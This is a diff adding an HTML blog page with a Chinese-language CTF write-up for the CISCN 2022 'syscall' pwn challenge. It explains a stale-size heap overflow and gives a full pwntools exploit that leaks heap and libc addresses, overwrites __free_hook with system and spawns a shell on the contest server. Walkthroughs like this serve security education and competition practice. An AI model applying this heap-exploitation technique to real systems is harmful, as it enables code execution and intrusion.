@@ -1,0 +1,214 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ciscn2022_syscall - Dreamcat</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="ciscn2022_syscall程序的漏洞点在于free后不会清空size数组对应的数据，而且在同一个该位置再次申请一个chunk的时候，
+1234567891011121314151617181,"> 
+    <meta name="author" content="dreamcat"> 
+    <link rel="alternative" href="atom.xml" title="Dreamcat" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="ciscn2022_syscall - Dreamcat"/>
+    <meta name="twitter:description" content="ciscn2022_syscall程序的漏洞点在于free后不会清空size数组对应的数据，而且在同一个该位置再次申请一个chunk的时候，
+1234567891011121314151617181,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Dreamcat"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="ciscn2022_syscall - Dreamcat"/>
+    <meta property="og:description" content="ciscn2022_syscall程序的漏洞点在于free后不会清空size数组对应的数据，而且在同一个该位置再次申请一个chunk的时候，
+1234567891011121314151617181,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dreamcat</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ciscn2022_syscall</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ciscn2022_syscall</h1>
+        <div class="stuff">
+            <span>六月 18, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="ciscn2022-syscall"><a href="#ciscn2022-syscall" class="headerlink" title="ciscn2022_syscall"></a>ciscn2022_syscall</h1><p>程序的漏洞点在于free后不会清空size数组对应的数据，而且在同一个该位置再次申请一个chunk的时候，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">17</span> )                    <span class="comment">// malloc</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = (syscall)(<span class="number">38929LL</span>, sub_E1B, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      <span class="keyword">if</span> ( (syscall)(<span class="number">38929LL</span>, getheap_ptr, idx, <span class="number">0LL</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      v2 = (syscall)(<span class="number">38929LL</span>, strings, <span class="number">5LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, printf_, v2, <span class="number">5LL</span>);</span><br><span class="line">      szie = (syscall)(<span class="number">38929LL</span>, read_, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( szie &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      <span class="keyword">if</span> ( szie &gt; <span class="number">40</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">      v3 = (syscall)(<span class="number">38929LL</span>, malloc_, szie, <span class="number">0LL</span>);<span class="comment">// malloc</span></span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, saveheap, idx, v3);</span><br><span class="line">      v4 = (syscall)(<span class="number">38929LL</span>, strings, <span class="number">9LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, printf_, v4, <span class="number">0LL</span>);</span><br><span class="line">      v5 = szie;</span><br><span class="line">      v6 = (syscall)(<span class="number">38929LL</span>, getheap_ptr, idx, <span class="number">0LL</span>);</span><br><span class="line">      (syscall)(<span class="number">0x1231</span>LL, v6, v5, <span class="number">0LL</span>);</span><br><span class="line">      v7 = (syscall)(<span class="number">38929LL</span>, getheap_ptr, idx, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (syscall)(<span class="number">38929LL</span>, sub_E62, v7, <span class="number">0LL</span>) )<span class="comment">// ke I					//这里会检查我们输入的数据是否为DEADBEEF</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_32;													<span class="comment">//如果是就会跳转，而下面则是记录这次我们申请的size</span></span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, read_context, idx, szie);</span><br><span class="line">      v8 = (syscall)(<span class="number">38929LL</span>, getheap_ptr, idx, <span class="number">0LL</span>) &amp; <span class="number">0xFFF</span>;</span><br><span class="line">      v9 = (syscall)(<span class="number">38929LL</span>, strings, <span class="number">7LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      (syscall)(<span class="number">38929LL</span>, printf_, v9, v8);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">      </span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;如果是就会跳转，而下面则是记录这次我们申请的size，这里一旦跳转，size数组不会被更改，可能存在溢出。如上一次我们在这个位置放的堆块，申请的size是0x28,下一次我们申请的是0x10，数据为DEADBEEF，这里的size依旧是0x28，造成溢出。</p>
+<p>思路</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p>申请出来四个chunk，size数组都是为0x28</p>
+<p>然后申请4个0x10，数据为DEADBEEF</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">new_add</span>():</span><br><span class="line">    r.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;content: &#x27;</span>,<span class="built_in">str</span>(<span class="string">&#x27;DEADBEEF&#x27;</span>)) </span><br><span class="line"></span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br></pre></td></tr></table></figure>
+
+<p>这里就会造成溢出。先后释放2，1，两个chunk进入tcache，并且1对应的chunk的fd指针指向2，chunk0只有0x20。我们输出chunk0，一共输出0x28字节，将chunk1的fd指针泄露出来，就完成了堆地址的泄露。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>接下来，我们修改chunk3的头部，将其size从0x21改为largebin的大小范围，free(3)令其进入unsortedbins，我们在申请时，不要覆盖掉原本的bk指针就可以泄露出libc的地址。</p>
+<p>这里free(3)要绕过检查，所以我们将伪造他的下一个chunk的size。先后释放2,1,使chunk1的fd指向chunk2，利用chunk0的溢出，修改chnnk1的fd，使其指向我们的目标地址。将伪造的chunk3的下一个堆的头写为合法的大小。同时这个伪造的chunk的下一堆的size也要合法，但是我们只能写0x28字节，所以我们将第一个伪造成0x11，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">new_add() <span class="comment">#1 0x370</span></span><br><span class="line"></span><br><span class="line">new_add() <span class="comment">#2 0x390</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x501</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">aimed_addr = heap_addr+<span class="number">0x10</span>+<span class="number">0x500</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>+p64(aimed_addr))</span><br><span class="line">new_add()       <span class="comment">#1  0x370</span></span><br><span class="line"></span><br><span class="line">new_add()    <span class="comment">#20x8a0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>))</span><br></pre></td></tr></table></figure>
+
+<p>现在chunk3 就可以正常free，绕过检查。我们从unsortedbins上申请一个chunk，完成libc的泄露</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">3</span>)</span><br><span class="line">new_add()</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">8</span>)</span><br><span class="line">libcbase = u64(r.recv(<span class="number">8</span>))-<span class="number">0x3ec0d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>
+
+<p>后面就是我们修改__free_hook数据为system地址,触发getshell</p>
+<p>同样的手法。chunk0修改chunk1的fd，只不过这次是先后释放3，1，chunk1原本指向chunk3</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system = libcbase+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(system))</span><br><span class="line">pause()</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>getflag</p>
+<p><img src="C:\Users\32644\Desktop\ciscn\半决赛\赛题\二进制\1\1655218920143203\QQ图片20220618214051.png" alt="QQ图片20220618214051"></p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;172.16.9.42&#x27;</span>,<span class="number">8083</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">    offset = <span class="built_in">int</span>(r.recv(<span class="number">5</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_add</span>():</span><br><span class="line">    r.sendline(<span class="string">b&#x27;17&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;content: &#x27;</span>,<span class="built_in">str</span>(<span class="string">&#x27;DEADBEEF&#x27;</span>)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;68&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;51&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendline(<span class="string">&#x27;34&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line">new_add()</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"> </span><br><span class="line">new_add() <span class="comment">#1 0x370</span></span><br><span class="line"></span><br><span class="line">new_add() <span class="comment">#2 0x390</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x501</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">aimed_addr = heap_addr+<span class="number">0x10</span>+<span class="number">0x500</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>+p64(aimed_addr))</span><br><span class="line">new_add()       <span class="comment">#1  0x370</span></span><br><span class="line"></span><br><span class="line">new_add()    <span class="comment">#20x8a0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">new_add()</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">r.recv(<span class="number">8</span>)</span><br><span class="line">libcbase = u64(r.recv(<span class="number">8</span>))-<span class="number">0x3ec0d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">system = libcbase+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(system))</span><br><span class="line">pause()</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn2022-syscall"><span class="toc-number">1.</span> <span class="toc-text">ciscn2022_syscall</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
